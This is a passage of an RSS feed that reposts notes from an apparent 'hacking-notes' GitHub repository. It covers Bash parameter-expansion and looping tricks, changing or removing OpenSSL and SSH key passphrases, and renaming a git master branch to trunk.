&lt;span id=&quot;cb1-30&quot;&gt;&lt;a href=&quot;#cb1-30&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYVAR#&lt;/span&gt;*/&lt;span class=&quot;va&quot;&gt;}&lt;/span&gt;            # &lt;span class=&quot;ex&quot;&gt;path/to/file/file.tar.gz&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-31&quot;&gt;&lt;a href=&quot;#cb1-31&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYVAR##&lt;/span&gt;*/&lt;span class=&quot;va&quot;&gt;}&lt;/span&gt;           # &lt;span class=&quot;ex&quot;&gt;file.tar.gz&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-32&quot;&gt;&lt;a href=&quot;#cb1-32&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYVAR/&lt;/span&gt;file&lt;span class=&quot;va&quot;&gt;/&lt;/span&gt;newfile&lt;span class=&quot;va&quot;&gt;}&lt;/span&gt;  # &lt;span class=&quot;ex&quot;&gt;/path/to/newfile/file.tar.gz&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-33&quot;&gt;&lt;a href=&quot;#cb1-33&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYVAR//&lt;/span&gt;file&lt;span class=&quot;va&quot;&gt;/&lt;/span&gt;newfile&lt;span class=&quot;va&quot;&gt;}&lt;/span&gt; # &lt;span class=&quot;ex&quot;&gt;/path/to/newfile/newfile.tar.gz&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-34&quot;&gt;&lt;a href=&quot;#cb1-34&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYVAR:1:4}&lt;/span&gt;           # &lt;span class=&quot;ex&quot;&gt;path&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-35&quot;&gt;&lt;a href=&quot;#cb1-35&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYVAR:&lt;/span&gt;&lt;span class=&quot;er&quot;&gt;(-6)&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;:3}&lt;/span&gt;        # &lt;span class=&quot;fu&quot;&gt;tar&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-36&quot;&gt;&lt;a href=&quot;#cb1-36&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-37&quot;&gt;&lt;a href=&quot;#cb1-37&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Setting defaults&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-38&quot;&gt;&lt;a href=&quot;#cb1-38&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-39&quot;&gt;&lt;a href=&quot;#cb1-39&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYVAR:-&lt;/span&gt;default&lt;span class=&quot;va&quot;&gt;}&lt;/span&gt; # &lt;span class=&quot;ex&quot;&gt;Return&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$MYVAR&lt;/span&gt;, or &lt;span class=&quot;st&quot;&gt;&amp;quot;default&amp;quot;&lt;/span&gt; if unset&lt;/span&gt;
&lt;span id=&quot;cb1-40&quot;&gt;&lt;a href=&quot;#cb1-40&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYVAR:=&lt;/span&gt;default&lt;span class=&quot;va&quot;&gt;}&lt;/span&gt; # &lt;span class=&quot;ex&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$MYVAR&lt;/span&gt; to &lt;span class=&quot;st&quot;&gt;&amp;quot;default&amp;quot;&lt;/span&gt; if unset&lt;/span&gt;
&lt;span id=&quot;cb1-41&quot;&gt;&lt;a href=&quot;#cb1-41&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYVAR:+&lt;/span&gt;default&lt;span class=&quot;va&quot;&gt;}&lt;/span&gt; # &lt;span class=&quot;ex&quot;&gt;Return&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;default&amp;quot;&lt;/span&gt; if &lt;span class=&quot;va&quot;&gt;$MYVAR&lt;/span&gt; set&lt;/span&gt;
&lt;span id=&quot;cb1-42&quot;&gt;&lt;a href=&quot;#cb1-42&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYVAR:?&lt;/span&gt;error&lt;span class=&quot;va&quot;&gt;}&lt;/span&gt;   # &lt;span class=&quot;ex&quot;&gt;Exit&lt;/span&gt; with &lt;span class=&quot;st&quot;&gt;&amp;quot;error&amp;quot;&lt;/span&gt; if &lt;span class=&quot;va&quot;&gt;$MYVAR&lt;/span&gt; unset&lt;/span&gt;
&lt;span id=&quot;cb1-43&quot;&gt;&lt;a href=&quot;#cb1-43&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-44&quot;&gt;&lt;a href=&quot;#cb1-44&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Variable variables&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-45&quot;&gt;&lt;a href=&quot;#cb1-45&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-46&quot;&gt;&lt;a href=&quot;#cb1-46&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;VAR1=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;Hello world&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-47&quot;&gt;&lt;a href=&quot;#cb1-47&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;VAR2=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;VAR1&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-48&quot;&gt;&lt;a href=&quot;#cb1-48&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${!VAR2}&lt;/span&gt; # &lt;span class=&quot;ex&quot;&gt;Hello&lt;/span&gt; world&lt;/span&gt;
&lt;span id=&quot;cb1-49&quot;&gt;&lt;a href=&quot;#cb1-49&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-50&quot;&gt;&lt;a href=&quot;#cb1-50&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Arrays&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-51&quot;&gt;&lt;a href=&quot;#cb1-51&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-52&quot;&gt;&lt;a href=&quot;#cb1-52&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;MYARRAY=(&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;element0&amp;quot;&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;element1&amp;quot;&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;element2&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-53&quot;&gt;&lt;a href=&quot;#cb1-53&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;MYARRAY[3]=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;element3&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-54&quot;&gt;&lt;a href=&quot;#cb1-54&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYARRAY[0]}&lt;/span&gt;     # &lt;span class=&quot;ex&quot;&gt;element0&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-55&quot;&gt;&lt;a href=&quot;#cb1-55&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYARRAY[-1]}&lt;/span&gt;    # &lt;span class=&quot;ex&quot;&gt;element3&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-56&quot;&gt;&lt;a href=&quot;#cb1-56&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYARRAY[@]}&lt;/span&gt;     # &lt;span class=&quot;ex&quot;&gt;element0&lt;/span&gt; element1 element2 element3&lt;/span&gt;
&lt;span id=&quot;cb1-57&quot;&gt;&lt;a href=&quot;#cb1-57&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYARRAY[@]:1:2}&lt;/span&gt; # &lt;span class=&quot;ex&quot;&gt;element1&lt;/span&gt; element2&lt;/span&gt;
&lt;span id=&quot;cb1-58&quot;&gt;&lt;a href=&quot;#cb1-58&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${!MYARRAY[@]}&lt;/span&gt;    # &lt;span class=&quot;ex&quot;&gt;0&lt;/span&gt; 1 2 3&lt;/span&gt;
&lt;span id=&quot;cb1-59&quot;&gt;&lt;a href=&quot;#cb1-59&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-60&quot;&gt;&lt;a href=&quot;#cb1-60&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Size of an array&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-61&quot;&gt;&lt;a href=&quot;#cb1-61&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-62&quot;&gt;&lt;a href=&quot;#cb1-62&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${#MYARRAY[@]}&lt;/span&gt; # &lt;span class=&quot;ex&quot;&gt;4&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-63&quot;&gt;&lt;a href=&quot;#cb1-63&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-64&quot;&gt;&lt;a href=&quot;#cb1-64&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Remove an element from an array&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-65&quot;&gt;&lt;a href=&quot;#cb1-65&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-66&quot;&gt;&lt;a href=&quot;#cb1-66&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;unset&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;MYARRAY[3]&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-67&quot;&gt;&lt;a href=&quot;#cb1-67&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-68&quot;&gt;&lt;a href=&quot;#cb1-68&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Arrays are actually a special case of dictionaries,&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-69&quot;&gt;&lt;a href=&quot;#cb1-69&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# which hold key/value pairs. In an array, keys are just&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-70&quot;&gt;&lt;a href=&quot;#cb1-70&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# 0-indexed numbers. Dictionaries work exactly the same&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-71&quot;&gt;&lt;a href=&quot;#cb1-71&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# as arrays, except rather than referencing/setting&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-72&quot;&gt;&lt;a href=&quot;#cb1-72&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# elements by number, you reference and set them by key.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-73&quot;&gt;&lt;a href=&quot;#cb1-73&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-74&quot;&gt;&lt;a href=&quot;#cb1-74&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Create a dictionary&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-75&quot;&gt;&lt;a href=&quot;#cb1-75&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-76&quot;&gt;&lt;a href=&quot;#cb1-76&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;declare&lt;/span&gt; -A &lt;span class=&quot;va&quot;&gt;MYDICT&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-77&quot;&gt;&lt;a href=&quot;#cb1-77&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-78&quot;&gt;&lt;a href=&quot;#cb1-78&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Math&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-79&quot;&gt;&lt;a href=&quot;#cb1-79&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-80&quot;&gt;&lt;a href=&quot;#cb1-80&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$((&lt;/span&gt; 1 + 2 &lt;span class=&quot;va&quot;&gt;))&lt;/span&gt; # &lt;span class=&quot;ex&quot;&gt;3&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-81&quot;&gt;&lt;a href=&quot;#cb1-81&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$RANDOM&lt;/span&gt;      # &lt;span class=&quot;ex&quot;&gt;Random-ish&lt;/span&gt; number&lt;/span&gt;
&lt;span id=&quot;cb1-82&quot;&gt;&lt;a href=&quot;#cb1-82&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-83&quot;&gt;&lt;a href=&quot;#cb1-83&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Loop over lines in a file&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-84&quot;&gt;&lt;a href=&quot;#cb1-84&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-85&quot;&gt;&lt;a href=&quot;#cb1-85&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LINE&lt;/span&gt;; &lt;span class=&quot;kw&quot;&gt;do&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-86&quot;&gt;&lt;a href=&quot;#cb1-86&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;co&quot;&gt;# Do stuff with $LINE&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-87&quot;&gt;&lt;a href=&quot;#cb1-87&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;done&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-88&quot;&gt;&lt;a href=&quot;#cb1-88&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-89&quot;&gt;&lt;a href=&quot;#cb1-89&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Loop over filenames with spaces&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-90&quot;&gt;&lt;a href=&quot;#cb1-90&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-91&quot;&gt;&lt;a href=&quot;#cb1-91&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;IFS=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;read&lt;/span&gt; -d &lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -r &lt;span class=&quot;va&quot;&gt;FILE&lt;/span&gt;; &lt;span class=&quot;kw&quot;&gt;do&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-92&quot;&gt;&lt;a href=&quot;#cb1-92&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;co&quot;&gt;# Do stuff with $FILE&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-93&quot;&gt;&lt;a href=&quot;#cb1-93&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;lt;(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$DIR&lt;/span&gt; -type f -print0&lt;span class=&quot;op&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-94&quot;&gt;&lt;a href=&quot;#cb1-94&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-95&quot;&gt;&lt;a href=&quot;#cb1-95&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# The advantage this has over other approaches is that it&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-96&quot;&gt;&lt;a href=&quot;#cb1-96&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# doesn&amp;#39;t create a subshell, so you can use variables set&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-97&quot;&gt;&lt;a href=&quot;#cb1-97&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# within the loop elsewhere. We need to temporarily&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-98&quot;&gt;&lt;a href=&quot;#cb1-98&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# override IFS because our list is null-separated; the&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-99&quot;&gt;&lt;a href=&quot;#cb1-99&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# space between the -d and the &amp;#39;&amp;#39; (an empty string, which&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-100&quot;&gt;&lt;a href=&quot;#cb1-100&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Bash interprets as the null character) is *required*.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://devhints.io/bash&quot;&gt;Bash scripting cheatsheet&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://bash.cyberciti.biz/guide/$IFS&quot;&gt;$IFS&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/a/10757531&quot;&gt;Bash - variable variables&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/a/23748641&quot;&gt;Looping through find output in Bash where file name contains white spaces&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Tue, 28 Mar 2023 03:19:57 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Bash%20Scripting%20Tricks.md</guid>
		</item>
		<item>
			<title>Change an OpenSSL Key Passphrase</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Change%20an%20OpenSSL%20Key%20Passphrase.md</link>
			<description>&lt;p&gt;To change a passphrase:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; rsa -des3 -in &lt;span class=&quot;va&quot;&gt;$OLD_KEY&lt;/span&gt; -out &lt;span class=&quot;va&quot;&gt;$NEW_KEY&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To remove a passphrase:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; rsa -in &lt;span class=&quot;va&quot;&gt;$OLD_KEY&lt;/span&gt; -out &lt;span class=&quot;va&quot;&gt;$NEW_KEY&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To check that a passphrase is correct:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; rsa -check -in &lt;span class=&quot;va&quot;&gt;$NEW_KEY&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
			<pubDate>Tue, 28 Mar 2023 03:19:57 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Change%20an%20OpenSSL%20Key%20Passphrase.md</guid>
		</item>
		<item>
			<title>Change an SSH Key Passphrase</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Change%20an%20SSH%20Key%20Passphrase.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;ssh-keygen&lt;/span&gt; -p -f &lt;span class=&quot;va&quot;&gt;$SSH_PRIVATE_KEY_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
			<pubDate>Tue, 28 Mar 2023 03:19:57 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Change%20an%20SSH%20Key%20Passphrase.md</guid>
		</item>
		<item>
			<title>Change the "master" Branch in Git to "trunk"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Change%20the%20%22master%22%20Branch%20in%20Git%20to%20%22trunk%22.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;git&lt;/span&gt; checkout -b trunk master &lt;span class=&quot;co&quot;&gt;# Create and switch to the&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                             &lt;span class=&quot;co&quot;&gt;# trunk branch&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;git&lt;/span&gt; push -u origin trunk     # Push the trunk branch to&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                             &lt;span class=&quot;co&quot;&gt;# the remote and track it&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;git&lt;/span&gt; branch -d master         # Delete local master&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Log into Bitbucket, go to the &amp;quot;Repository settings&amp;quot;,&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# and change the &amp;quot;Main branch&amp;quot; from &amp;quot;master&amp;quot; to &amp;quot;trunk&amp;quot;.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;git&lt;/span&gt; push --delete origin master &lt;span class=&quot;co&quot;&gt;# Delete remote master&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;git&lt;/span&gt; remote prune origin         # Delete the remote&lt;/span&gt;
